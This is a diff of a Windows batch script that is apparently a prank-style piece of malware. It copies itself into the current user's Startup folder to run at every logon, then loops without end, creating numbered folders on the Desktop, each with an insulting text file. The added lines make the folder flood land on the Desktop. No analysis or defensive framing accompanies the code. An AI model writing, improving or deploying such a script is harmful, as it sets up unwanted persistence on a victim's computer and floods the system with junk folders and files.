@@ -1,4 +1,5 @@
 @echo off
+cd Desktop
 COPY %0 "C:\Users\%username%\AppData\Roaming\Microsoft\Windows\Start Menu\Programs\Startup"
 (
 echo :Lock
@@ -12,5 +13,6 @@ set /a num=1
 md LMAO_%num%
 cd LMAO_%num%
 echo You're such a dumbass, this is folder #%num% and there are many more to go! XD > Dumbass.txt
+cd ..
 set num=%num%+1
 goto CreateFolderWithText
